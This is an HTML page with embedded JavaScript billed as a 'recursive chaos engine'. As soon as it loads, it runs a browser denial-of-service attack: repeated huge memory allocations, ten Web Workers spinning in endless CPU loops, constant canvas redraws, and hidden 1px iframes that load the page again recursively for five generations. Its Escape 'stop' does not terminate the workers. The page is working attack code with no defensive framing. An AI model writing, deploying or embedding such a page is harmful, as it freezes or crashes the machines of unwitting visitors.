<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>🔥 AUTO TAB/IFRAME STORM 🔥</title>
    <style>
        body { background: #110000; color: #ff4444; font-family: Arial; text-align: center; padding: 40px; }
        .warning { color: #ff8800; font-size: 1.4em; }
    </style>
</head>
<body>
    <h1>🔥 RECURSIVE CHAOS ENGINE 🔥</h1>
    <p class="warning">Just open this page. It starts automatically.<br>
    Press ESC to stop (if you can).</p>

    <script>
        let running = true;
        let generation = 0;
        const MAX_GEN = 5;
        const IFRAMES_PER_LEVEL = 4;

        const params = new URLSearchParams(window.location.search);
        generation = parseInt(params.get('gen') || '0');

        function createChaos() {
            if (!running) return;

            // === RESOURCE EXHAUSTION ===
            let arrays = [];
            setInterval(() => {
                if (!running) return;
                try {
                    arrays.push(new Array(20_000_000).fill(Math.random()));
                } catch(e) {}
            }, 30);

            // Heavy workers
            for (let i = 0; i < 10; i++) {
                try {
                    const worker = new Worker(URL.createObjectURL(new Blob([`
                        while(true) {
                            let x = 0;
                            for(let i=0; i<120_000_000; i++) x += Math.sin(i) * Math.sqrt(i);
                        }
                    `], {type: 'application/javascript'})));
                } catch(e) {}
            }

            // Canvas spam
            const canvas = document.createElement('canvas');
            canvas.width = 1200; canvas.height = 800;
            document.body.appendChild(canvas);
            const ctx = canvas.getContext('2d');
            function spam() {
                if (!running) return;
                ctx.fillStyle = `hsl(${Math.random()*360},100%,50%)`;
                ctx.fillRect(Math.random()*1200, Math.random()*800, 120, 120);
                requestAnimationFrame(spam);
            }
            spam();
        }

        function spawnIframes() {
            if (!running || generation >= MAX_GEN) return;

            const newGen = generation + 1;
            const base = window.location.origin + window.location.pathname + `?gen=${newGen}`;

            for (let i = 0; i < IFRAMES_PER_LEVEL; i++) {
                const iframe = document.createElement('iframe');
                iframe.src = base;
                iframe.style.display = 'none';           // hidden
                iframe.style.width = '1px';
                iframe.style.height = '1px';
                document.body.appendChild(iframe);
            }
        }

        function stopAll() {
            running = false;
            document.body.innerHTML += '<h2 style="color:lime">STOPPED - Refresh to restart</h2>';
        }

        // AUTO START
        window.addEventListener('load', () => {
            document.body.innerHTML += `<p style="color:yellow">Generation ${generation}</p>`;
            
            setTimeout(() => {
                createChaos();
                spawnIframes();
            }, 800);
        });

        document.addEventListener('keydown', e => {
            if (e.key === "Escape") stopAll();
        });
    </script>
</body>
</html>
